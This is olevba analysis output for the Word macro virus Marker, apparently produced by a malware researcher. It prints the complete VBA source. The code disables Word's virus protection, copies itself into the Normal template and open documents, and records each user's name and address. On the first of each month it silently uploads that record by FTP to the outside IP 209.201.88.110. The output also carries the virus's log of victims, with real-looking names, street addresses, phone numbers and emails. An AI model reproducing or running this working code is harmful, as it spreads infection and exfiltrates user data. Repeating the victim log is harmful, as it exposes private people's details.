olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-e8443e1de540f1f3c6d5baa93f1acff83efd2f71
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-e8443e1de540f1f3c6d5baa93f1acff83efd2f71 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:57:54 PM - Sunday, 13 Dec 1998
' Samir Al-Latifi
'



' 02:14:27  - woensdag, 20 jan 1999
' Hogeschool van Amsterdam
'



' 10:54:50  - vrijdag, 22 jan 1999
' Hogeschool van Amsterdam
'



' 04:47:02  - maandag, 15 feb 1999
' Hogeschool van Amsterdam
'



' 03:21:33  - donderdag, 18 feb 1999
' Hogeschool van Amsterdam
'



' 02:29:54  - vrijdag, 5 mrt 1999
' Hogeschool van Amsterdam
'



' 10:33:37  - tirsdag, 16 mar 1999
' Latifa Elghoul
'



' 08:14:17 PM - Friday, 19 Mar 1999
' klant
'



' 04:33:19  - woensdag, 24 mrt 1999
' Juridische Bibliotheek
'



' 11:17:25  - dinsdag, 13 apr 1999
' Juridische Bibliotheek
'



' 09:15:55  - dinsdag, 27 apr 1999
' Juridische Bibliotheek
'



' 12:52:12  - dinsdag, 27 apr 1999
' Juridische Bibliotheek
'



' 03:11:16  - vrijdag, 30 apr 1999
' Fam. van den Burg
'



' 05:19:40  - maandag, 10 mei 1999
' Student
'



' 04:53:40  - Tuesday, 18 May 1999
' Student
'



' 05:17:48 PM - Wednesday, 26 May 1999
' Student
'



' 04:38:16  - maandag, 14 jun 1999
' Student
'



' 05:35:08  - dinsdag, 29 jun 1999
' Martin Schravesande
'



' 04:11:03  - zondag, 18 jul 1999
' Maat op Locatie
'



' 01:40:58  - zondag, 3 okt 1999
' Edwin Schravesande
' Oranjeplein 97
' 2515 LK Den Haag
' 070-3841732
' oranjepl@euronet.nl



' 04:43:58 PM - Tuesday, 5 Oct 1999
' Studentenvereniging SSRA
' Leidsegracht 108
' 1016 CT   Amsterdam
' +31-20-6221791 / +31-20-6239437
' ssra@dds.nl



' 11:36:52  - woensdag, 13 okt 1999
' Nietveranderen!
'



' 10:43:18  - maandag, 6 dec 1999
' Ranzijn
' N.L. Nadall
' Pres. Kennedylaan 88
' 1079 NH Amsterdam



' 02:28:57  - zaterdag, 25 mrt 2000
' Schreuder
'



' 03:31:54  - woensdag, 12 apr 2000
' T.A. Bik
'



' 08:12:27 PM - Thursday, 5 Sep 2002
' Linden
'



' 03:34:34  - maandag, 6 jan 2003
' Een tevreden Microsoft Office-gebruiker
'



' 02:57:45  - donderdag, 9 jan 2003
' Een tevreden Microsoft Office-gebruiker
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

